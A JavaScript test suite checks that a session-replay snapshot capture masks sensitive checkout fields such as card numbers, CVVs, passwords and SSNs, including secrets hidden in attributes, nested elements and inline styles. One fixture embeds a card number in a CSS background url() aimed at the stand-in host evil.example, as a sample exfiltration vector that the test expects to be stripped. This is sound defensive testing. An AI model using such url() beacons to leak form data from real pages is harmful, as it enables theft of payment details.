import { describe, it, expect } from 'vitest';
import { captureSnapshot, collectSnapshotStrings, sanitizeMaskedStyle } from './capture.js';

/**
 * Regression test for the compliance rule: masked fields must never hit the
 * wire. We build a realistic checkout form, type real secrets into the
 * sensitive fields, capture a snapshot, then serialize it exactly as a
 * transport would (JSON.stringify) and assert NONE of the secrets appear
 * anywhere in the payload, not in `value`, not in attributes, not in text.
 */

const CC_NUMBER = '4111111111111111';
const CVV = '321';
const EXPIRY = '12/29';
const PASSWORD = 'sup3r-s3cret-pw';
const SSN = '078-05-1120';

function buildCheckoutForm() {
  const root = document.createElement('div');
  root.innerHTML = `
    <form id="checkout">
      <input id="firstName" name="firstName" autocomplete="given-name" />
      <input id="cc" name="cardNumber" autocomplete="cc-number" />
      <input id="cvv" name="cvv" autocomplete="cc-csc" />
      <input id="exp" name="cc-exp" autocomplete="cc-exp" />
      <input id="pw" name="password" type="password" />
      <input id="ssn" name="ssn" data-rum-mask />
      <input id="color" name="favoriteColor" data-rum-unmask />
      <div id="secret-banner" data-rum-block>
        <span>Internal note: ${SSN}</span>
      </div>
      <p id="welcome">Welcome back</p>
    </form>
  `;
  // Set the LIVE values (both property and attribute) the way a real user
  // would have typed them, to make sure neither path leaks.
  const set = (id, v) => {
    const el = root.querySelector(`#${id}`);
    el.value = v;
    el.setAttribute('value', v);
  };
  set('firstName', 'Ada');
  set('cc', CC_NUMBER);
  set('cvv', CVV);
  set('exp', EXPIRY);
  set('pw', PASSWORD);
  set('ssn', SSN);
  set('color', 'blue');
  return root;
}

describe('capture-time masking: secrets never hit the wire', () => {
  it('omits every masked secret from the serialized payload', () => {
    const root = buildCheckoutForm();
    const snapshot = captureSnapshot(root); // maskAllInputs default ON
    const wire = JSON.stringify(snapshot);

    for (const secret of [CC_NUMBER, CVV, EXPIRY, PASSWORD, SSN]) {
      expect(wire).not.toContain(secret);
    }
  });

  it('still captures an explicitly unmasked, non-sensitive field', () => {
    const root = buildCheckoutForm();
    const snapshot = captureSnapshot(root);
    const wire = JSON.stringify(snapshot);
    // The opt-out field is not sensitive, so its value is allowed through.
    expect(wire).toContain('blue');
  });

  it('drops blocked subtrees entirely (no children, no leaked text)', () => {
    const root = buildCheckoutForm();
    const snapshot = captureSnapshot(root);
    const strings = collectSnapshotStrings(snapshot);
    // The blocked banner contained the SSN in plain text, so it must be gone.
    expect(strings.join('\n')).not.toContain(SSN);
    expect(strings.join('\n')).not.toContain('Internal note');
  });

  it('preserves masked value length so replay geometry survives', () => {
    const root = buildCheckoutForm();
    const snapshot = captureSnapshot(root);
    const cc = snapshot.children
      .find((c) => c.attributes?.id === 'checkout')
      .children.find((c) => c.attributes?.id === 'cc');
    expect(cc.masked).toBe(true);
    expect(cc.value).toBe('*'.repeat(CC_NUMBER.length));
  });

  it('keeps non-sensitive default-masked inputs masked but length-stable', () => {
    const root = buildCheckoutForm();
    const snapshot = captureSnapshot(root);
    const first = snapshot.children
      .find((c) => c.attributes?.id === 'checkout')
      .children.find((c) => c.attributes?.id === 'firstName');
    // Default maskAllInputs masks even a benign first-name field.
    expect(first.masked).toBe(true);
    expect(first.value).toBe('***');
  });

  it('masks text in nested child elements under an explicitly masked subtree', () => {
    // Regression: serializeNode previously passed the inherited mask only to
    // direct text nodes, so a child element of a masked subtree was
    // reclassified to `unmask` and its text leaked raw.
    const root = document.createElement('div');
    root.innerHTML = `
      <div data-rum-mask>
        <span>topsecret</span>
        <b>visible <i>deeplyNested</i></b>
      </div>
    `;
    const snapshot = captureSnapshot(root);
    const wire = JSON.stringify(snapshot);
    for (const leak of ['topsecret', 'visible', 'deeplyNested']) {
      expect(wire).not.toContain(leak);
    }
  });

  it('masks secrets carried in non-value attributes on a masked element', () => {
    // Regression: only `value`/`data-value` were masked before, so a secret
    // mirrored into title/aria-label/placeholder/alt/href/data-* leaked.
    const root = document.createElement('div');
    root.innerHTML = `
      <input
        id="t"
        class="form-control"
        data-rum-mask
        value="SECRETVALUE"
        title="SECRETTITLE"
        aria-label="SECRETARIA"
        placeholder="SECRETPLACEHOLDER"
        alt="SECRETALT"
        href="https://x/SECRETHREF"
        data-text="SECRETDATATEXT"
        data-label="SECRETDATALABEL"
        data-anything="SECRETDATAANY"
      />
    `;
    const snapshot = captureSnapshot(root.querySelector('#t'));
    const wire = JSON.stringify(snapshot);
    for (const leak of [
      'SECRETVALUE',
      'SECRETTITLE',
      'SECRETARIA',
      'SECRETPLACEHOLDER',
      'SECRETALT',
      'SECRETHREF',
      'SECRETDATATEXT',
      'SECRETDATALABEL',
      'SECRETDATAANY',
    ]) {
      expect(wire).not.toContain(leak);
    }
  });

  it('strips secrets smuggled through inline style on a masked element', () => {
    // Regression: `style` was kept verbatim, so a secret in a custom property,
    // url(), or content string leaked despite the node being masked.
    const root = document.createElement('div');
    root.innerHTML = `
      <input id="a" data-rum-mask style="--typed-value: 4111111111111111; display: none" />
      <input id="b" data-rum-mask style="background: url(https://evil.example/4222222222222222)" />
      <input id="c" data-rum-mask style="content: '4333333333333333'" />
      <input id="d" data-rum-mask style="font-family: '4444444444444444'" />
    `;
    for (const id of ['a', 'b', 'c', 'd']) {
      const snapshot = captureSnapshot(root.querySelector(`#${id}`));
      const wire = JSON.stringify(snapshot);
      for (const leak of [
        '4111111111111111',
        '4222222222222222',
        '4333333333333333',
        '4444444444444444',
        'evil.example',
      ]) {
        expect(wire).not.toContain(leak);
      }
    }
  });

  it('keeps safe layout declarations from a masked element style', () => {
    const root = document.createElement('div');
    root.innerHTML = `<input id="s" data-rum-mask style="--secret: 4111111111111111; display: none; width: 120px" />`;
    const snapshot = captureSnapshot(root.querySelector('#s'));
    expect(snapshot.attributes.style).toBe('display: none; width: 120px');
  });

  it('sanitizeMaskedStyle drops unsafe declarations but keeps allowlisted geometry', () => {
    expect(sanitizeMaskedStyle('--x: secret; display: flex; gap: 8px')).toBe(
      'display: flex; gap: 8px',
    );
    expect(sanitizeMaskedStyle('background-image: url(http://x/secret)')).toBe('');
    expect(sanitizeMaskedStyle("content: 'secret'")).toBe('');
    expect(sanitizeMaskedStyle('')).toBe('');
  });

  it('keeps inline style verbatim on UNMASKED nodes (scoping check)', () => {
    const root = document.createElement('div');
    root.innerHTML = `<div id="u" style="--brand: teal; display: grid">ok</div>`;
    const snapshot = captureSnapshot(root.querySelector('#u'));
    // An unmasked node is not a secret surface; its full style is preserved.
    expect(snapshot.masked).toBe(false);
    expect(snapshot.attributes.style).toContain('--brand: teal');
  });

  it('keeps safe structural attributes verbatim on a masked element', () => {
    // Replay still needs id/class/type for geometry and styling.
    const root = document.createElement('div');
    root.innerHTML = `<input id="keepme" class="form-control" type="text" data-rum-mask title="leak" />`;
    const snapshot = captureSnapshot(root.querySelector('#keepme'));
    expect(snapshot.attributes.id).toBe('keepme');
    expect(snapshot.attributes.class).toBe('form-control');
    expect(snapshot.attributes.type).toBe('text');
    expect(snapshot.attributes.title).not.toContain('leak');
  });

  it('masks a nested input under a masked subtree even when it carries an unmask hint', () => {
    // Masking is sticky downward: a descendant cannot re-expose content that an
    // ancestor chose to mask, even with maskAllInputs off and an unmask hint.
    const root = document.createElement('div');
    root.innerHTML = `<div data-rum-mask><input id="n" data-rum-unmask /></div>`;
    const inp = root.querySelector('#n');
    inp.value = 'leakme';
    inp.setAttribute('value', 'leakme');
    const snapshot = captureSnapshot(root, { maskAllInputs: false });
    const wire = JSON.stringify(snapshot);
    expect(wire).not.toContain('leakme');
  });

  it('leaks nothing when the whole form is captured with maskAllInputs off but sensitive fields stay masked', () => {
    const root = buildCheckoutForm();
    const snapshot = captureSnapshot(root, { maskAllInputs: false });
    const wire = JSON.stringify(snapshot);
    // Non-sensitive values now ride along...
    expect(wire).toContain('Ada');
    // ...but cc/cvv/expiry/password are ALWAYS masked regardless of the flag.
    for (const secret of [CC_NUMBER, CVV, EXPIRY, PASSWORD]) {
      expect(wire).not.toContain(secret);
    }
  });
});
